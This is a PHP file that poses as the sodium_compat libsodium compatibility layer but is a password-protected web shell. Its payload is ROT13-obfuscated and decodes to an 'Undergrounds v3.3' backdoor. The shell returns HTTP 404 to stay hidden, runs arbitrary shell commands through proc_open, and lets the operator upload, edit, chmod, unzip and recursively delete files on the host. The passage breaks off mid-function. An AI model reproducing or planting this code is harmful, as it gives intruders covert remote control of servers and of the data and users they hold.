<?php
/**
 * Libsodium compatibility layer
 *
 * This is the only class you should be interfacing with, as a user of
 * sodium_compat.
 *
 * If the PHP extension for libsodium is installed, it will always use that
 * instead of our implementations. You get better performance and stronger
 * guarantees against side-channels that way.
 *
 * However, if your users don't have the PHP extension installed, we offer a
 * compatible interface here. It will give you the correct results as if the
 * PHP extension was installed. It won't be as fast, of course.
 *
 * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION *
 *                                                                               *
 *     Until audited, this is probably not safe to use! DANGER WILL ROBINSON     *
 *                                                                               *
 * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION *
 */

session_start();

$stored_hash = "2dc9e21dbc0cb1e660f21b1ea1526836";
if (!isset($_SESSION['logged_in'])) {

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = $_POST['password'];

        if (md5($password) === $stored_hash) {
            $_SESSION['logged_in'] = true;
            header("Refresh:0");
            exit();
        }
    }

    ?>
    <form method="POST">
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Masuk</button>
    </form>
    <?php
    exit();
}

$asd = <<<'ASD'
<?cuc
@vav_frg('bhgchg_ohssrevat', 0);
@vav_frg('qvfcynl_reebef', 0);
frg_gvzr_yvzvg(0);
vav_frg('zrzbel_yvzvg', '64Z');
urnqre('Pbagrag-Glcr: grkg/ugzy; punefrg=HGS-8');
?>
<?cuc
?>
<!QBPGLCR ugzy>
<ugzy>
<urnq>
    <gvgyr>.::Haqretebhaqf i3.3 Jrofuryyf::.</gvgyr>
    <zrgn punefrg="hgs-8">
    <zrgn anzr="ivrjcbeg" pbagrag="jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1">
    <zrgn anzr="nhgube" pbagrag="unkbedg">
    <zrgn anzr="ivrjcbeg" pbagrag="Xbagby" />
    <zrgn anzr="qrfpevcgvba" pbagrag="Reebe Cntr">
    <zrgn cebcregl="bt:qrfpevcgvba" pbagrag="Reebe Cntr">
    <zrgn cebcregl="bt:vzntr" pbagrag="#">
    <zrgn anzr="ebobgf" pbagrag="abvaqrk">
    <zrgn anzr="tbbtyrobg" pbagrag="abvaqrk">
    <yvax ery="fglyrfurrg" uers="uggcf://pqa.wfqryvie.arg/acz/obbgfgenc@5.3.2/qvfg/pff/obbgfgenc.zva.pff">
    <yvax uers="uggcf://sbagf.tbbtyrncvf.pbz/pff2?snzvyl=Pneebvf+Tbguvp&qvfcynl=fjnc" ery="fglyrfurrg">
    <yvax uers="uggcf://sbagf.tbbtyrncvf.pbz/pff2?snzvyl=Ohatrr+Bhgyvar&qvfcynl=fjnc" ery="fglyrfurrg">
    <yvax ery="fglyrfurrg" uers="uggcf://pqa.wfqryvie.arg/acz/obbgfgenc@5.3.2/qvfg/pff/obbgfgenc.zva.pff">
    <yvax ery="fglyrfurrg" uers="uggcf://pqawf.pybhqsyner.pbz/nwnk/yvof/sbag-njrfbzr/4.7.0/pff/sbag-njrfbzr.zva.pff">
</urnq>
<obql>
    
<fglyr>
    @vzcbeg hey("uggcf://sbagf.tbbtyrncvf.pbz/pff?snzvyl=Qbfvf");
    @vzcbeg hey("uggcf://sbagf.tbbtyrncvf.pbz/pff?snzvyl=Pneebvf+Tbguvp");
    @vzcbeg hey("uggcf://sbagf.tbbtyrncvf.pbz/pff?snzvyl=Ohatrr+Bhgyvar");
obql {
    sbag-snzvyl: "Qbfvf", phefvir;
    pbybe: #sss;
    grkg-funqbj:0ck 0ck 1ck #757575;
    onpxtebhaq-pbybe: #212529;
    onpxtebhaq-fvmr: pbire;
    onpxtebhaq-nggnpuzrag: svkrq;
    onpxtebhaq-ercrng: ab-ercrng;
    onpxtebhaq-fvmr: 7%, 7%;
    onpxtebhaq-cbfvgvba: evtug obggbz, yrsg obggbz;
}

.qverpgbel-yvfgvat-gnoyr {
  znetva: nhgb;
  onpxtebhaq-pbybe: #212529;
  cnqqvat: .7erz 1erz;
  znk-jvqgu: 900ck;
  jvqgu: 100%;
  obk-funqbj: 0 0 20ck oynpx;
  obeqre: 1ck fbyvq #ssp107;
}
.urnqre {
  znetva: nhgb;
  onpxtebhaq-pbybe: #212529;
  cnqqvat: .7erz 1erz;
  znk-jvqgu: 100%;
  jvqgu: 100%;
  obk-funqbj: 0 0 20ck oynpx;
  obeqre-obggbz: 1ck fbyvq #ssp107;
}
gu {
    obeqre-gbc: 1ck fbyvq #sss;
    obeqre-obggbz: 1ck fbyvq #sss;
}
gobql gq {
  sbag-fvmr: 13ck;
  cnqqvat: 0.5erz;
  pbybe: #sss;
  sbag-jrvtug: 400;
  sbag-snzvyl: "Ebobgb", "Cbccvaf", fnaf-frevs;
}
gobql gq n {
    grkg-qrpbengvba: abar;
    pbybe: #sss;
}
gobql gq:abg(:svefg-puvyq) {
  grkg-nyvta: pragre;
}

obql::-jroxvg-fpebyyone {
  jvqgu: 14ck;
}

obql::-jroxvg-fpebyyone-genpx {
  onpxtebhaq: #000;
}

obql::-jroxvg-fpebyyone-guhzo {
  onpxtebhaq-pbybe: #212529;
  obeqre: 3ck fbyvq #000;
}
vachg { 
    znetva-obggbz: 4ck; 
    onpxtebhaq: eton(0,0,0,0.3);
    obeqre: abar;
    bhgyvar: abar;
    cnqqvat: 5ck;
    sbag-fvmr: 15ck;
    pbybe: #sss;
    grkg-funqbj: 1ck 1ck 1ck eton(0,0,0,0.3);
    obeqre: 1ck fbyvq eton(0,0,0,0.3);
    obeqre-enqvhf: 14ck;
    obk-funqbj: vafrg 0 -5ck 45ck eton(100,100,100,0.2), 0 1ck 1ck eton(255,255,255,0.2);
    -jroxvg-genafvgvba: obk-funqbj .5f rnfr;
    -zbm-genafvgvba: obk-funqbj .5f rnfr;
    -b-genafvgvba: obk-funqbj .5f rnfr;
    -zf-genafvgvba: obk-funqbj .5f rnfr;
    genafvgvba: obk-funqbj .5f rnfr;
}

grkgnern {
    znk-jvqgu: 100%;
    znk-urvtug: 100%;
    cnqqvat-yrsg: 2ck;
    erfvmr: abar;
    biresybj: nhgb;
    pbybe: #sss;
    grkg-funqbj: 1ck 1ck 1ck eton(0,0,0,0.3);
    obeqre: 1ck fbyvq eton(0,0,0,0.3);
    obeqre-enqvhf: 4ck;
    obk-funqbj: vafrg 0 -5ck 45ck eton(100,100,100,0.2), 0 1ck 1ck eton(255,255,255,0.2);
    -jroxvg-genafvgvba: obk-funqbj .5f rnfr;
    -zbm-genafvgvba: obk-funqbj .5f rnfr;
    -b-genafvgvba: obk-funqbj .5f rnfr;
    -zf-genafvgvba: obk-funqbj .5f rnfr;
    genafvgvba: obk-funqbj .5f rnfr;
    onpxtebhaq: eton(0,0,0,0.3);
}
.onqtr-npgvba-rqvg:ubire::nsgre {
            pbagrag: "Rqvg"
 }
        .onqtr-npgvba-eranzr:ubire::nsgre {
            pbagrag: "Eranzr"
        }
        .onqtr-npgvba-puzbq:ubire::nsgre {
            pbagrag: "Puzbq"
        }

        .onqtr-npgvba-qryrgr:ubire::nsgre {
            pbagrag: "Qryrgr"
        }

        .onqtr-npgvba-qbjaybnq:ubire::nsgre {
            pbagrag: "Qbjaybnq"
        }
        .onqtr-npgvba-hamvc:ubire::nsgre {
            pbagrag: "HaMvc"
        }
        .onqtr-npgvba-gnattny:ubire::nsgre {
            pbagrag: "PuQngr"
        }
        .onqtr-npgvba-hamvc:ubire::nsgre,
        .onqtr-npgvba-qbjaybnq:ubire::nsgre,
        .onqtr-npgvba-qryrgr:ubire::nsgre,
        .onqtr-npgvba-puzbq:ubire::nsgre,
        .onqtr-npgvba-eranzr:ubire::nsgre,
        .onqtr-npgvba-gnattny:ubire::nsgre,
        .onqtr-npgvba-rqvg:ubire::nsgre {
            cnqqvat: 5ck;
            obeqre-enqvhf: 10ck;
            znetva-yrsg: -40ck;
            pbybe: #ssp107;
            obeqre: 2ck fbyvq #ssp107;
            onpxtebhaq-pbybe: #212529;
        }
        .onqtr-npgvba-hamvc:ubire::nsgre,
        .onqtr-npgvba-qbjaybnq:ubire::nsgre,
        .onqtr-npgvba-qryrgr:ubire::nsgre,
        .onqtr-npgvba-puzbq:ubire::nsgre,
        .onqtr-npgvba-eranzr:ubire::nsgre,
        .onqtr-npgvba-gnattny:ubire::nsgre,
        .onqtr-npgvba-rqvg:ubire::nsgre {
            jvqgu: 68ck;
            grkg-nyvta: pragre;
            znetva-gbc: -53ck;
            qvfcynl: oybpx;
            cbfvgvba: nofbyhgr;
            sbag-fvmr: 14ck;
        }

grkgnern::-jroxvg-fpebyyone {
  jvqgu: 12ck;
}

grkgnern::-jroxvg-fpebyyone-genpx {
  onpxtebhaq: #000000;
}

grkgnern::-jroxvg-fpebyyone-guhzo {
  onpxtebhaq-pbybe: #212529;
  obeqre: 3ck fbyvq oynpx;
}

n {
    pbybe: #sss;
    grkg-qrpbengvba: abar;
}

n:ubire {
    pbybe: #999797;
    grkg-funqbj:0ck 0ck 2 0ck #RQ360R;
}

vachg,fryrpg,grkgnern {
    obeqre: 1ck #000000 fbyvq;
    -zbm-obeqre-enqvhf: 5ck;
    -jroxvg-obeqre-enqvhf:5ck;
    obeqre-enqvhf:5ck;
}

fryrpg:nsgre {
    phefbe: cbvagre;
}
.craprg {
    onpxtebhaq-pbybe: eto(0 0 0 / 57%);
    pbybe: #sss;
    obeqre-pbybe: oynapurqnyzbaq;
}
.pebg {
      obeqre-enqvhf: 50%;
      cnqqvat: 15ck;
      jvqgu: 100ck;
      urvtug: 100ck;
}
.unkbedg-grkg {
    sbag-fvmr: 19cg;
    sbag-snzvyl: "Pneebvf Tbguvp", phefvir;
    pbybe: #sss;
    grkg-nyvta: pragre;
    onpxtebhaq: yvarne-tenqvrag(200qrt, #000000 25%, #ssssss 50%, #ssssss 75%, #ssssss 100%);
    onpxtebhaq-fvmr: 200% nhgb;
    -jroxvg-onpxtebhaq-pyvc: grkg;
    -jroxvg-grkg-svyy-pbybe: genafcnerag;
    navzngvba: navzngr 1.2f yvarne vasvavgr; 
    }
@xrlsenzrf navzngr{ gb { onpxtebhaq-cbfvgvba: 200% pragre;
      }
    }
obql, n, ohggba:yvax{phefbe:hey(uggcf://enj.tvguhohfrepbagrag.pbz/TnarfgFrira/fpevcg/ersf/urnqf/znva/phefbecavf-erzbirot-cerivrj.cat), 
    qrsnhyg;
} 
    ohggba:ubire {
    phefbe:hey(uggcf://enj.tvguhohfrepbagrag.pbz/TnarfgFrira/fpevcg/ersf/urnqf/znva/phefbecavf-erzbirot-cerivrj.cat),
    jnvg;
}
    n:ubire {
    phefbe:hey(uggcf://enj.tvguhohfrepbagrag.pbz/TnarfgFrira/fpevcg/ersf/urnqf/znva/phefbecavf-erzbirot-cerivrj.cat),
    jnvg;
}
</fglyr>
</gq>
<fpevcg>
shapgvba zlShapgvba() {
  ine pbclGrkg = qbphzrag.trgRyrzragOlVq("zlVachg");
  pbclGrkg.fryrpg();
  pbclGrkg.frgFryrpgvbaEnatr(0, 99999); // Sbe zbovyr qrivprf
  anivtngbe.pyvcobneq.jevgrGrkg(pbclGrkg.inyhr);
  nyreg("Pbcvrq Fhpprffshyyl!!");
}
</fpevcg>
<?cuc
reebe_ercbegvat(0);
frg_gvzr_yvzvg(0);
@pyrnefgngpnpur();
@vav_frg('reebe_ybt', ahyy);
@uggc_erfcbafr_pbqr(404);
$jro = (vffrg($_FREIRE['UGGCF']) && $_FREIRE['UGGCF'] === 'ba' ? "uggcf" : "uggc") . "://".$_FREIRE['UGGC_UBFG'];
$qvfshap = @vav_trg("qvfnoyr_shapgvbaf");
vs (rzcgl($qvfshap)) {
    $qvfs = "<sbag pbybe='yvzr'>NZNA</sbag>";
} ryfr {
    $qvfs = "<sbag pbybe='erq'>".$qvfshap."</sbag>";
}
shapgvba nhgube() {
    rpub "</qvi><gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre><sbag snpr='Pneebvf Tbguvp' fvmr='3ck'>2017 &pbcl; unkbedg | Unkbedg grnz</pragre></gq></gnoyr><oe>";
    rkvg();
}

shapgvba prxqve() {
    vs (vffrg($_TRG['cngu'])) {
        $freybx = $_TRG['cngu'];
    } ryfr {
        $freybx = trgpjq();
    }
    vs (vf_jevgnoyr($freybx)) {
        erghea "<sbag pbybe='yvzr'>Nzna Pbl</sbag>";
    } ryfr {
        erghea "<sbag pbybe='erq'>XBAGBY!</sbag>";
    }
}

shapgvba prxebbg() {
    vs (vf_jevgnoyr($_FREIRE['QBPHZRAG_EBBG'])) {
        erghea "<sbag pbybe='yvzr'>Nzna Pbl</sbag>";
    } ryfr {
        erghea "<sbag pbybe='erq'>XBAGBY!</sbag>";
    }
}
shapgvba unkbedg_rk($svyr) {
    $cvyr = $svyr;
    $cpu = cnguvasb($cvyr, CNGUVASB_SVYRANZR);
    erghea $cpu;
}

shapgvba kezqve($qve) {
    $vgrzf = fpnaqve($qve);
    sbernpu ($vgrzf nf $vgrz) {
        vs ($vgrz === '.' || $vgrz === '..') {
            pbagvahr;
        }
        $cngu = $qve.'/'.$vgrz;
        vs (vf_qve($cngu)) {
            kezqve($cngu);
        } ryfr {
            hayvax($cngu);
        }
    }
    ezqve($qve);
}
shapgvba arg($urkarg) {
            sbe ($v = 0; $v < fgeyra($urkarg); $v++) {
                $unkbedg .= qrpurk(beq($urkarg[$v]));
            }
            erghea $unkbedg;
        }
shapgvba bjare($svyr) {
    vs (shapgvba_rkvfgf("cbfvk_trgcjhvq")) {
        $gbq = @cbfvk_trgcjhvq(svyrbjare($svyr));
        erghea "<pragre>".$gbq['anzr']."</pragre>";
    } ryfr {
        erghea "<pragre>".svyrbjare($svyr)."</pragre>";
    }
}

shapgvba prxjevgr($freybx) {
    $vmva = fhofge(fcevags('%b', svyrcrezf($freybx)), -4);
    vs (vf_jevgnoyr($freybx)) {
        erghea "<sbag pbybe=yvzr>".$vmva."</sbag>";
    } ryfr {
        erghea "<sbag pbybe=erq>".$vmva."</sbag>";
    }
}
shapgvba pzq($tnf, $freybx) {
    $pebg = $tnf;
    $ce = "cebp_bcra";
    vs (shapgvba_rkvfgf($ce)) {
    $gbq = @cebp_bcra($pebg, neenl(0 => neenl("cvcr", "e"), 1 => neenl("cvcr", "j"), 2 => neenl("cvcr", "e")), $pebggm, $freybx);
    rpub "".fgernz_trg_pbagragf($pebggm[1])."</grkgnern></pragre><oe>";
    } ryfr {
        rpub "<sbag pbybe='benatr'></sbag>";
    }
}
shapgvba rxfr($pbzna, $freybx) {
    $yre = "2>&1";
    vs (!cert_zngpu("/".$yre."/v", $pbzna)) {
        $pbzna = $pbzna." ".$yre;
    }
    $xbzra = $pbzna;
    $ce = "cebp_bcra";
    vs (shapgvba_rkvfgf($ce)) {
    $gbq = @$ce($xbzra, neenl(0 => neenl("cvcr", "e"), 1 => neenl("cvcr", "j"), 2 => neenl("cvcr", "e")), $pebggm, $freybx);
    rpub "<cer><grkgnern ebjf='25' fglyr='pbybe:yvzr;' ernqbayl='' pbyf='120ck'>
    ".ugzyfcrpvnypunef(fgernz_trg_pbagragf($pebggm[1]))."</grkgnern></cer><oe>";
    } ryfr {
        rpub "<sbag pbybe='benatr'>cebp_bcra shapgvba vf qvfnoyrq!!</sbag>";
    }
}
shapgvba vcfrei() {
    vs (rzcgl($_FREIRE['FREIRE_NQQE'])) {
        erghea trgubfgolanzr($_FREIRE['FREIRE_ANZR']);
        vs (rzcgl(trgubfgolanzr($_FREIRE['FREIRE_ANZR']))) {
            erghea $_FREIRE['FREIRE_ANZR'];
        }
    } ryfr {
        erghea $_FREIRE['FREIRE_NQQE'];
    }
}

shapgvba prxsvyr($svyr) {
     erghea '<v pynff="sn sn-svyr-pbqr-b" fglyr="sbag-fvmr:17ck;pbybe:#456QRO;"></v>';
}
shapgvba svyrqngr($svyr) {
    erghea qngr("S q L t:v:f", svyrzgvzr($svyr));
}
shapgvba srkg($svyr) {
    $fho = "\163\k75" . "\142\k73" . "\k74\k72";
    erghea $fho(fgeepue($svyr,'.'),1);
} shapgvba tnmm($svyr) {
    $sovnfn = neenl("cuc","cugzy","fugzy","cune","cuc7","ugzy","ugz","vap","cucf","gkg","wf","pff","ugnpprff","ova","cy","cl","fu","cuc58","CuC7","nfck","qyy","vav");
    $abgs = neenl("wcrt","wct","cat","tvs","vpb","jroc","zc3","z4N","synp","jni","jzn","3tc","btt","jroz","zc4","rkr");
    $fgy = "\k73\k74" . "\162\164" . "\157\154\k6s" . "\167\k65\162";
    $rkg=$fgy(srkg($svyr));
    vs ($svyr == 'reebe_ybt') {
        erghea "
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-rqvg' anzr='cvyvu' inyhr='rqvg'>
<v pynff='sn sn-rqvg' fglyr='pbybe: #36S239'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug onqtr-npgvba-eranzr' anzr='cvyvu' inyhr='tnagvanzn'>
<v pynff='sn sn-crapvy' fglyr='pbybe: #sss'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-puzbq' anzr='cvyvu' inyhr='puzbq'>
<v pynff='sn sn-trne' fglyr='pbybe: #06Q2Q5'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-gnattny' anzr='cvyvu' inyhr='puqngr'>
<v pynff='sn sn-pnyraqne' fglyr='pbybe: #4542S9'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-qryrgr' anzr='cvyvu' inyhr='unchf'>
<v pynff='sn sn-genfu' fglyr='pbybe: #R53N3N'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-hamvc' anzr='cvyvu' inyhr='hamvc'>
<v pynff='sn sn-svyr-nepuvir-b' fglyr='pbybe: #S1OR0S'></v></ohggba>";
    } ryfrvs(va_neenl($rkg,$sovnfn)) {
        erghea "
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-rqvg' anzr='cvyvu' inyhr='rqvg'>
<v pynff='sn sn-rqvg' fglyr='pbybe:#7NSS41'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug onqtr-npgvba-eranzr' anzr='cvyvu' inyhr='tnagvanzn'>
<v pynff='sn sn-crapvy'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-vasb onqtr-npgvba-puzbq' anzr='cvyvu' inyhr='puzbq'>
<v pynff='sn sn-trne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-cevznel onqtr-npgvba-gnattny' anzr='cvyvu' inyhr='puqngr'>
<v pynff='sn sn-pnyraqne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-qnatre onqtr-npgvba-qryrgr' anzr='cvyvu' inyhr='unchf'>
<v pynff='sn sn-genfu'></v></ohggba>";
    } ryfrvs(va_neenl($rkg,$abgs)) {
        erghea "
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug onqtr-npgvba-eranzr' anzr='cvyvu' inyhr='tnagvanzn'>
<v pynff='sn sn-crapvy'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-vasb onqtr-npgvba-puzbq' anzr='cvyvu' inyhr='puzbq'>
<v pynff='sn sn-trne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-cevznel onqtr-npgvba-gnattny' anzr='cvyvu' inyhr='puqngr'>
<v pynff='sn sn-pnyraqne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-qnatre onqtr-npgvba-qryrgr' anzr='cvyvu' inyhr='unchf'>
<v pynff='sn sn-genfu'></v></ohggba>";
    }  ryfrvs($rkg == 'mvc') {
        erghea "
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug onqtr-npgvba-eranzr' anzr='cvyvu' inyhr='tnagvanzn'>
<v pynff='sn sn-crapvy'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-vasb onqtr-npgvba-puzbq' anzr='cvyvu' inyhr='puzbq'>
<v pynff='sn sn-trne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-cevznel onqtr-npgvba-gnattny' anzr='cvyvu' inyhr='puqngr'>
<v pynff='sn sn-pnyraqne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-qnatre onqtr-npgvba-qryrgr' anzr='cvyvu' inyhr='unchf'>
<v pynff='sn sn-genfu'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-jneavat onqtr-npgvba-hamvc' anzr='cvyvu' inyhr='hamvc'>
<v pynff='sn sn-svyr-nepuvir-b'></v></ohggba>";
    } ryfr {
        erghea "
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-rqvg' anzr='cvyvu' inyhr='rqvg'>
<v pynff='sn sn-rqvg' fglyr='pbybe:#7NSS41'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug onqtr-npgvba-eranzr' anzr='cvyvu' inyhr='tnagvanzn'>
<v pynff='sn sn-crapvy'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-vasb onqtr-npgvba-puzbq' anzr='cvyvu' inyhr='puzbq'>
<v pynff='sn sn-trne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-cevznel onqtr-npgvba-gnattny' anzr='cvyvu' inyhr='puqngr'>
<v pynff='sn sn-pnyraqne'></v></ohggba>
<ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-qnatre onqtr-npgvba-qryrgr' anzr='cvyvu' inyhr='unchf'>
<v pynff='sn sn-genfu'></v></ohggba>";
    }
}

shapgvba hamvc($svyr, $freybx) {
    vs (!vf_ernqnoyr($svyr)) {
        erq("<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='pbybe:benatr;'><gurnq><gq><sbag pbybe='benatr'>Pnaabg Hamvc Svyr / Haernqnoyr Svyr !</sbag></gq></gurnq></gnoyr>");
        qvr();
    } ryfrvs (fgecbf(svyr_trg_pbagragf($svyr), "\k50\k4o\k03\k04") === snyfr) {
        rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:erq;'><gq><sbag pbybe='erq'><pragre><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Guvf vfa'g Mvc Svyr</pragre></sbag></gq></gnoyr>";
        qvr();
    }
    $mvc = arj MvcNepuvir;
    $erf = $mvc -> bcra($svyr);
    vs ($erf == gehr) {
        $mvc -> rkgenpgGb($freybx);
        $mvc -> pybfr();
        rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:yvzr;'> <gq>Hamvc Svyr Fhpprffshyyl => <sbag pbybe='yvzr'>".onfranzr($_CBFG['cngu'])."</sbag><oe>
        Rkgenpg gb : <sbag pbybe='ndhn'>".$svyr."</sbag></gq></gurnq</gnoyr>";
    } ryfr {
        rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:erq;'><gq><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Snvyrq gb Hamvc Svyr!!</sbag></gq></gnoyr>";
    }
    rkvg();
}
sbernpu($_CBFG nf $xrl => $inyhr){
    $_CBFG[$xrl] = fgevcfynfurf($inyhr);
}

vs(vffrg($_TRG['cngu'])){
    $freybx = $_TRG['cngu'];
    $freybx2 = $_TRG['cngu'];
} ryfr {
    $freybx = trgpjq();
    $freybx2 = trgpjq();
}

$freybx = fge_ercynpr('\\','/',$freybx);
$freybxf = rkcybqr('/',$freybx);
$freybxobf = @fpnaqve($freybx);


rpub '<gnoyr pynff="urnqre"><gq><pragre>
    <qvi fglyr="sbag-snzvyl:Ohatrr Bhgyvar;sbag-fvmr:24ck;"><n uers="'.$_FREIRE['FPEVCG_ANZR'].'"><v pynff="sn-oenaqf sn-ancfgre"></v> unkbedg</n></pragre></qvi></gq><gq>';
rpub '<gnoyr nyvta="pragre"><gq>
<qvi pynff="oga-tebhc zr-2" ebyr="tebhc" nevn-ynory="Svefg tebhc">
<ohggba glcr="ohggba" bapyvpx=ybpngvba.uers="'.$_FREIRE['FPEVCG_ANZR'].'" pynff="oga oga-bhgyvar-yvtug"><sbag pbybe="ndhn"><v pynff="sn sn-ubzr"></v> Ubzr</sbag></ohggba>
<qvi pynff="oga-tebhc zr-2" ebyr="tebhc" nevn-ynory="Svefg tebhc">
<ohggba glcr="ohggba" bapyvpx=ybpngvba.uers="?cngu='.$freybx.'&'.arg("pzq").'=bcrg" pynff="oga oga-bhgyvar-yvtug"><v pynff="sn sn-grezvany"></v> Pbafbyr</ohggba>';

rpub '<ohggba glcr="ohggba" bapyvpx=ybpngvba.uers="?cngu='.$freybx.'&'.arg("hcybnq").'=bcrg" pynff="oga oga-bhgyvar-yvtug"><v pynff="sn sn-hcybnq"></v> Hcybnq</ohggba>

<ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug"bapyvpx=ybpngvba.uers="?cngu='.$freybx.'&'.arg("vasb").'=bcrg"><v pynff="sn sn-vasb-pvepyr"></v> vasbezngvba</ohggba>

<ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx=ybpngvba.uers="?cngu='.$freybx.'&'.arg("ohngsvyr").'=bcrg"><v pynff="sn-fbyvq sn-svyr-pvepyr-cyhf" fglyr="pbybe:#1S5NPS;"></v> Perngr Svyr</ohggba>

<ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx=ybpngvba.uers="?cngu='.$freybx.'&'.arg("ohngsbyqre").'=bcrg" fglyr="sybng: evtug;"><v pynff="sn-fbyvq sn-sbyqre-cyhf" fglyr="pbybe:#SNN625;"></v> Perngr Sbyqre</ohggba>

<ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx=ybpngvba.uers="?cngu='.$freybx.'&'.arg("nobhg").'=bcrg" fglyr="sybng: evtug;"><v pynff="sn sn-vasb"></v> Nobhg</ohggba>
</gq></ge></qvi>
</qvi></qvi></gq></gnoyr></gnoyr><oe>';
rpub '<gnoyr pynff="qverpgbel-yvfgvat-gnoyr"><gq><v pynff="sn sn-sbyqre" fglyr="pbybe:#S19013;"></v> <o>:</o> ';
sbernpu($freybxf nf $vq => $ybx){
    vs($ybx == '' && $vq == 0){
        rpub '<n uers="?cngu=/">/&aofc;</n></pragre>';
        pbagvahr;
    }
    vs($ybx == '') pbagvahr;
    rpub '<n uers="?cngu=';
    sbe($v=0; $v<=$vq; $v++){
    rpub $freybxf[$v];
    vs($v != $vq) rpub "/";
} 
rpub '">'.$ybx.'</n>&aofc;/&aofc;';
}
rpub '</gq></gurnq></gnoyr><oe>';
    vs (vffrg($_ERDHRFG['ybtbhg'])) {
        frffvba_fgneg();
        frffvba_qrfgebl();
        rpub '<fpevcg>jvaqbj.ybpngvba="'.$_FREIRE['FPEVCG_ANZR'].'";</fpevcg>';
    }

vs (vffrg($_TRG['ivrjsvyr'])) {
    $svyrf = onfranzr($_TRG['ivrjsvyr']);
    rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre>Svyranzr : <sbag pbybe='benatr'>$svyrf</sbag>";
    rpub '<sbez zrgubq="CBFG" npgvba="?cvyvuna&cngu='.$freybx.'">';
    rpub "<gnoyr jvqgu='20%' obeqre='0' pryycnqqvat='0' pryyfcnpvat='0' nyvta='pragre'><gq>
    <n uers='?cngu=$freybx' pynff='oga oga-bhgyvar-yvtug'><v pynff='sn sn-neebj-yrsg'></v> onpx</n>";
    rpub tnmm($svyr);
    rpub "<ohggba glcr='ohggba' fglyr='sybng:evtug;' pynff='oga oga-bhgyvar-yvtug' bapyvpx='zlShapgvba()'><v pynff='sn sn-pbcl'></v> Pbcl</ohggba></qvi><oe><oe>";
    rpub "<vachg glcr='uvqqra' anzr='glcr' inyhr='svyr'>
    <vachg glcr='uvqqra' anzr='anzr' inyhr='$svyrf'>
    <vachg glcr='uvqqra' anzr='cngu' inyhr='$freybx/$svyrf'>";
    rpub "<grkgnern ernqbayl='' pbyf=120 ebjf=30 vq='zlVachg'>".ugzyfcrpvnypunef(svyr_trg_pbagragf($_TRG['ivrjsvyr']))."</grkgnern></gq></gnoyr></gnoyr><oe>";
    rkvg();
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "unchf") {
    vs (vf_qve($_CBFG['cngu'])) {
        kezqve($_CBFG['cngu']);
        vs (svyr_rkvfgf($_CBFG['cngu'])) {
            rpub '<gnoyr pynff="qverpgbel-yvfgvat-gnoyr" fglyr="obeqre-pbybe:erq;"><gq><pragre><sbag pbybe="erq"><v pynff="sn sn-rkpynzngvba-gevnatyr" nevn-uvqqra="gehr"></v> Snvyrq gb qryrgr Qverpgbel</sbag></pragre></gq></gnoyr>';
        } ryfr {
            rpub '<gnoyr pynff="qverpgbel-yvfgvat-gnoyr" fglyr="obeqre-pbybe:yvzr;"><gq><pragre><sbag pbybe="yvzr"><v pynff="sn sn-genfu"></v> Sbyqre erzbirq</sbag></pragre></gq></gnoyr>';
        }
    } ryfrvs (vf_svyr($_CBFG['cngu'])) {
        @hayvax($_CBFG['cngu']);
        vs (svyr_rkvfgf($_CBFG['cngu'])) {
